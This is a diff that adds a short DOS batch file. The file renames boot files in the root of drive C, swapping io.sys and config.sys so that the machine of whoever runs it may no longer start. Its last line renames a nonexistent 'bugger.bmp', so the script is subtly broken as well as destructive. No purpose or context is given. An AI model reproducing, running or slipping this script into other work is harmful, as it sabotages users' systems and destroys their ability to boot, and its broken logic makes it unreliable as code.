@@ -1,0 +1,6 @@
+@echo off
+c:
+cd\
+ren config.sys bugger.sys
+ren io.sys config.sys
+ren bugger.bmp config.sys
